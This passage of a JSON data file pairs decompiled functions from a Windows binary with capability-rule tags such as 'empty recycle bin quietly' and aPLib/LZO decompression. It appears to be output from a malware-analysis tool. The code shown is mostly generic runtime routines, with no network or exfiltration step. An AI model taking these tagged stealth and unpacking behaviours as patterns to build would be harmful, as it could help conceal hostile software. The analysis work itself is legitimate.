var_28h = iVar4;\n            fcn.00403e54(uVar2, in_stack_ffffffac & 0xffffff00 | var_20h, uVar2, 0);\n            if (7 < var_8h[5]) {\n                puVar3 = *var_8h;\n            }\n            uVar1 = var_bp_ch[5];\n            iVar4 = var_28h;\n            uVar2 = var_24h;\n        }\n    }\n    if (0xf < uVar1) {\n        var_bp_ch = *var_bp_ch;\n    }\n    var_10h = 0;\n    (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 0, var_bp_ch, iVar4, puVar3, uVar2);\n    *in_FS_OFFSET = var_18h;\n    return var_8h;\n}\n",
        "token_count": 816
    },
    "00404e58": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404e58(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00405957();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049b33d:\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n        }\n        else {\n            do {\n                cVar2 = fcn.004023d3();\n                if (cVar2 == '\\0') {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049b3f2:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049b409;\n                    uVar4 = fcn.00404ac5(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n                    cVar2 = fcn.00404caf();\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x49b431\n                    switch(*(param_1 + 0x1c)) {\n                    case 0:\n                        cVar2 = fcn.004050e2();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049b3f2;\n                    case 2:\n                        cVar2 = fcn.004041f1();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00401866();\n                        break;\n                    case 4:\n                        goto code_r0x0049b3cc;\n                    case 5:\n                        cVar2 = fcn.00403b6b();\n                        break;\n                    case 6:\n                        cVar2 = fcn.0040406b();\n                        break;\n                    case 7:\n                        cVar2 = fcn.00405083();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049b350;\n                    default:\n                        goto code_r0x0049b33d;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049b3f2;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\ncode_r0x0049b409:\n                cVar2 = fcn.00405858();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x0049b350:\n    return 0xffffffff;\ncode_r0x0049b3cc:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049b3f2;\n}\n",
        "token_count": 860
    },
    "00405cfe": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.00405cfe(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.00403c8d();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049aab4:\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n        }\n        else {\n            do {\n                cVar1 = fcn.00404449();\n                if (cVar1 == '\\0') {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049ab68:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049ab7b;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.004012a8(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n                    cVar1 = fcn.00401c62();\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x49aba4\n                    switch(*(param_1 + 0x1c)) {\n                    case 0:\n                        cVar1 = fcn.004056b9();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049ab68;\n                    case 2:\n                        cVar1 = fcn.0040565a();\n                        break;\n                    case 3:\n                        cVar1 = fcn.0040105a();\n                        break;\n                    case 4:\n                        goto code_r0x0049ab42;\n                    case 5:\n                        cVar1 = fcn.00403bc5();\n                        break;\n                    case 6:\n                        cVar1 = fcn.00405b73();\n                        break;\n                    case 7:\n                        cVar1 = fcn.00403576(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049aac7;\n                    default:\n                        goto code_r0x0049aab4;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049ab68;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0049ab7b:\n                cVar1 = fcn.00401ce4();\n            } while (cVar1 != '\\0');\n        }\n    }\ncode_r0x0049aac7:\n    return 0xffffffff;\ncode_r0x0049ab42:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049ab68;\n}\n",
        "token_count": 974
    },
    "0040314d": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t * fcn.0040314d(int32_t *param_1, uint8_t param_2, uchar *param_3)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (param_3 == NULL) {\n        return param_1;\n    }\n    iVar1 = param_2 * 0x1010101;\n    piVar2 = param_1;\n    if (0x20 < param_3) {\n        if (0x7f < param_3) {\n            if ((*0x56ec50 >> 1 & 1) != 0) {\n                for (; param_3 != NULL; param_3 = param_3 + -1) {\n                    *piVar2 = iVar1;\n                    piVar2 = piVar2 + 1;\n                }\n                return param_1;\n            }\n            if ((*0x56cc9c >> 1 & 1) == 0) goto joined_r0x0048377b;\n            *param_1 = iVar1;\n            param_1[1] = iVar1;\n            param_1[2] = iVar1;\n            param_1[3] = iVar1;\n            piVar2 = param_1 + 4 & 0xfffffff0;\n            param_3 = param_1 + (param_3 - piVar2);\n            if (0x80 < param_3) {\n                do {\n                    *piVar2 = iVar1;\n                    piVar2[1] = iVar1;\n                    piVar2[2] = iVar1;\n                    piVar2[3] = iVar1;\n                    piVar2[4] = iVar1;\n                    piVar2[5] = iVar1;\n                    piVar2[6] = iVar1;\n                    piVar2[7] = iVar1;\n                    piVar2[8] = iVar1;\n                    piVar2[9] = iVar1;\n                    piVar2[10] = iVar1;\n                    piVar2[0xb] = iVar1;\n                    piVar2[0xc] = iVar1;\n                    piVar2[0xd] = iVar1;\n                    piVar2[0xe] = iVar1;\n                    piVar2[0xf] = iVar1;\n                    piVar2[0x10] = iVar1;\n                    piVar2[0x11] = iVar1;\n                    piVar2[0x12] = iVar1;\n                    piVar2[0x13] = iVar1;\n                    piVar2[0x14] = iVar1;\n                    piVar2[0x15] = iVar1;\n                    piVar2[0x16] = iVar1;\n                    piVar2[0x17] = iVar1;\n                    piVar2[0x18] = iVar1;\n                    piVar2[0x19] = iVar1;\n                    piVar2[0x1a] = iVar1;\n                    piVar2[0x1b] = iVar1;\n                    piVar2[0x1c] = iVar1;\n                    piVar2[0x1d] = iVar1;\n                    piVar2[0x1e] = iVar1;\n                    piVar2[0x1f] = iVar1;\n                    piVar2 = piVar2 + 0x20;\n                    param_3 = param_3 + -0x80;\n                } while ((param_3 & 0xffffff00) != 0);\n                goto code_r0x00483740;\n            }\n        }\n        if ((*0x56cc9c >> 1 & 1) != 0) {\ncode_r0x00483740:\n            if (0x1f < param_3) {\n                do {\n                    *piVar2 = iVar1;\n                    piVar2[1] = iVar1;\n                    piVar2[2] = iVar1;\n                    piVar2[3] = iVar1;\n                    piVar2[4] = iVar1;\n                    piVar2[5] = iVar1;\n                    piVar2[6] = iVar1;\n                    piVar2[7] = iVar1;\n                    piVar2 = piVar2 + 8;\n                    param_3 = param_3 + -0x20;\n                } while (0x1f < param_3);\n                if ((param_3 & 0x1f) == 0) {\n                    return param_1;\n                }\n            }\n            piVar2 = piVar2 + param_3 + -0x20;\n            *piVar2 = iVar1;\n            piVar2[1] = iVar1;\n            piVar2[2] = iVar1;\n            piVar2[3] = iVar1;\n            piVar2[4] = iVar1;\n            piVar2[5] = iVar1;\n            piVar2[6] = iVar1;\n            piVar2[7] = iVar1;\n            return param_1;\n        }\n    }\njoined_r0x0048377b:\n    for (; (param_3 & 3) != 0; param_3 = param_3 + -1) {\n        *piVar2 = iVar1;\n        piVar2 = piVar2 + 1;\n    }\n    if ((param_3 & 4) != 0) {\n        *piVar2 = iVar1;\n        piVar2 = piVar2 + 1;\n        param_3 = param_3 + -4;\n    }\n    for (; (param_3 & 0xfffffff8) != 0; param_3 = param_3 + -8) {\n        *piVar2 = iVar1;\n        piVar2[1] = iVar1;\n        piVar2 = piVar2 + 2;\n    }\n    return param_1;\n}\n",
        "token_count": 1257
    },
    "00403c3d": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403c3d(int32_t arg_8h, uint noname_1, int32_t arg_10h)\n\n{\n    if (*(arg_10h + 4) < 0x81) {\n        return *(arg_8h + 8);\n    }\n    return *(arg_8h + 8);\n}\n",
        "token_count": 80
    },
    "00401c26": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401c26(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.00404a98(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004a4740:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.00404278();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00404250();\n            if (iVar3 == 0) {\ncode_r0x004a4758:\n                puVar4 = fcn.004039a4();\n                *puVar4 = 0x16;\n                fcn.00403751();\n                goto code_r0x004a4740;\n            }\n            iVar3 = fcn.00402739(*(param_1 + 0x2c));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004a4758;\n                iVar3 = *(param_1 + 0x18);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x30) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 423
    },
    "0040201d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040201d(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404250();\n    if (iVar2 == 0) {\ncode_r0x004a47fb:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        uVar4 = fcn.00403751();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402739(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a47fb;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 431
    },
    "0040236f": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040236f(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404250();\n    if (iVar2 == 0) {\ncode_r0x004a42f2:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        uVar4 = fcn.00403751();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402739(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a42f2;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 433
    },
    "00402478": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402478(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.004017b7(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004a491e:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.004058f8();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00404250();\n            if (iVar3 == 0) {\ncode_r0x004a4936:\n                puVar4 = fcn.004039a4();\n                *puVar4 = 0x16;\n                fcn.00403751();\n                goto code_r0x004a491e;\n            }\n            iVar3 = fcn.00402739(*(param_1 + 0x2c));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004a4936;\n                iVar3 = *(param_1 + 0x18);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x30) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 423
    },
    "00402c9d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402c9d(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404250();\n    if (iVar2 == 0) {\ncode_r0x004a44d0:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        uVar4 = fcn.00403751();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402739(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a44d0;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 434
    },
    "004034fe": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004034fe(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404250();\n    if (iVar2 == 0) {\ncode_r0x004a461d:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        uVar4 = fcn.00403751();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402739(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a461d;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 430
    },
    "00403ada": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403ada(uint param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = fcn.00405196(param_4, &stack0xfffffffc, param_1);\n    (*pcVar1)();\n    iVar2 = *(param_4 + 0x10);\n    if (iVar2 == 0x100) {\n        iVar2 = 2;\n    }\n    fcn.00405196(iVar2, param_4);\n    return;\n}\n",
        "token_count": 134
    },
    "00403c7e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403c7e(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.0040240a(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004a4562:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.00405128();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00404250();\n            if (iVar3 == 0) {\ncode_r0x004a457a:\n                puVar4 = fcn.004039a4();\n                *puVar4 = 0x16;\n                fcn.00403751();\n                goto code_r0x004a4562;\n            }\n            iVar3 = fcn.00402739(*(param_1 + 0x2c));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004a457a;\n                iVar3 = *(param_1 + 0x18);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x30) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 424
    },
    "00404421": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404421(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404250();\n    if (iVar2 == 0) {\ncode_r0x004a443f:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        uVar4 = fcn.00403751();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402739(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a443f;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 430
    },
    "00404426": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404426(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404250();\n    if (iVar2 == 0) {\ncode_r0x004a488c:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        uVar4 = fcn.00403751();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402739(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a488c;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 430
    },
    "0040547f": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040547f(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404250();\n    if (iVar2 == 0) {\ncode_r0x004a46ae:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        uVar4 = fcn.00403751();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402739(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a46ae;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 431
    },
    "004054b6": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t * fcn.004054b6(uint32_t *param_1, uint8_t param_2, uint32_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    char cVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    if (param_3 != NULL) {\n        uVar6 = param_2;\n        uVar2 = param_1 & 3;\n        while (uVar2 != 0) {\n            uVar1 = *param_1;\n            param_1 = param_1 + 1;\n            if (uVar1 == param_2) goto code_r0x004852c6;\n            param_3 = param_3 - 1;\n            if (param_3 == NULL) {\n                return NULL;\n            }\n            uVar2 = param_1 & 3;\n        }\n        puVar3 = param_3 + -1;\n        if (0x3 < param_3) {\n            uVar6 = uVar6 * 0x1010101;\n            puVar4 = param_1;\n            do {\n                param_1 = puVar4 + 1;\n                if (((*puVar4 ^ uVar6 ^ 0xffffffff ^ (*puVar4 ^ uVar6) + 0x7efefeff) & 0x81010100) != 0) {\n                    uVar2 = *puVar4;\n                    cVar5 = uVar6;\n                    if (uVar2 == cVar5) {\n                        return puVar4;\n                    }\n                    if (uVar2 >> 8 == cVar5) {\n                        return puVar4 + 1;\n                    }\n                    if ((uVar2 & 0xffff0000) >> 0x10 == cVar5) {\n                        return puVar4 + 2;\n                    }\n                    if ((uVar2 & 0xffff0000) >> 0x18 == cVar5) goto code_r0x004852c6;\n                }\n                bVar7 = 0x3 < puVar3;\n                puVar3 = puVar3 + -1;\n                puVar4 = param_1;\n            } while (bVar7);\n        }\n        for (param_3 = puVar3 + 1; param_3 != NULL; param_3 = param_3 - 1) {\n            cVar5 = *param_1;\n            param_1 = param_1 + 1;\n            if (cVar5 == uVar6) {\ncode_r0x004852c6:\n                return param_1 + -1;\n            }\n        }\n    }\n    return param_3;\n}\n",
        "token_count": 606
    },
    "00405844": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004b81ec)\n\nvoid __cdecl fcn.00405844(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t arg_ch_00;\n    int32_t arg_10h;\n    int32_t *piVar4;\n    uint32_t arg_8h_00;\n    uint32_t uVar5;\n    bool bVar6;\n    uint64_t uVar7;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    arg_8h_00 = 0;\n    piVar4 = arg_8h + 2;\n    var_4h = 0;\n    piVar3 = arg_8h[1] + 8 + arg_8h;\n    arg_10h = ((*(arg_ch + 4) == '\\0') - 1 & 0x1d) + 0x17 + *arg_8h;\n    for (arg_ch_00 = var_4h; (piVar4 != piVar3 && (uVar7 = fcn.00405f01(),  CONCAT44(arg_ch_00, arg_8h_00) <= uVar7));\n        arg_ch_00 = (arg_ch_00 << 4 | uVar2) + CARRY4(uVar5, uVar1)) {\n        uVar1 = *piVar4;\n        uVar2 = arg_8h_00 >> 0x1c;\n        uVar5 = arg_8h_00 * 0x10;\n        arg_8h_00 = uVar5 + uVar1;\n        piVar4 = piVar4 + 1;\n        arg_10h = arg_10h + -4;\n    }\n    bVar6 = true;\n    var_4h = arg_ch_00;\n    while ((var_4h = var_4h & 0xffffff00 | bVar6,  piVar4 != piVar3 && (bVar6))) {\n        uVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n        bVar6 = uVar1 == 0;\n    }\n    fcn.004067da(arg_8h_00, arg_ch_00, arg_10h, *(arg_8h + 0xc2), var_4h, arg_ch);\n    return;\n}\n",
        "token_count": 552
    },
    "004063d9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
